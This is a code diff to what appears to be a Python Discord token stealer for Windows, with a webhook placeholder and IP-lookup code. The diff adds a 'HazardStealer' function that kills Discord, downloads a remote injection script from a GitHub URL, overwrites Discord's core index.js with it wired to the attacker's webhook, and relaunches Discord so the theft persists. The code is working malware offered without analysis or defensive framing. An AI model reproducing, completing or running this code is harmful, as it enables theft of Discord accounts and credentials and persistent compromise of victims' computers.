@@ -3,6 +3,8 @@ if os.name != "nt":
 	exit()
 from re import findall
 import json
+import requests
+import psutil
 import platform as plt
 from json import loads, dumps
 from base64 import b64decode
@@ -10,7 +12,7 @@ from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
 from datetime import datetime
 
-webhook_url = "YOUR WEBHOOK HERE"
+webhook_url = "YOUR_WEBHOOK_HERE"
 
 languages = {
 	'da'    : 'Danish, Denmark',
@@ -118,7 +120,6 @@ def main():
 	embeds = []
 	working = []
 	checked = []
-	already_cached_tokens = []
 	working_ids = []
 	computer_os = plt.platform()
 	ip,org,loc,city,country,region,googlemap = getip()
@@ -217,5 +218,33 @@ def main():
 	except:
 		pass
 
+def HazardStealer():
+	try:
+		for proc in psutil.process_iter():
+			if any(procstr in proc.name() for procstr in\
+				['discord', 'Discord', 'DISCORD',]):
+				proc.kill()
+
+		for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
+			for name in dirs:
+				if (name.__contains__("discord_desktop_core-")):
+					directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
+					os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
+					index_content = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean")
+					with open(directory_list, 'wb') as index_file:
+						index_file.write(index_content.content)
+					with open(directory_list, 'r+') as index_file2:
+						replace_string = index_file2.read().replace("%WEBHOOK_LINK%", webhook_url)
+					with open(directory_list, 'w'): pass
+					with open(directory_list, 'r+') as index_file3:
+						index_file3.write(replace_string)
+		for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
+			for name in files:
+				discord_file = os.path.join(root, name)
+				os.startfile(discord_file)
+	except:
+		pass
+
 if __name__ == "__main__":
-    main()
+	main()
+	HazardStealer()
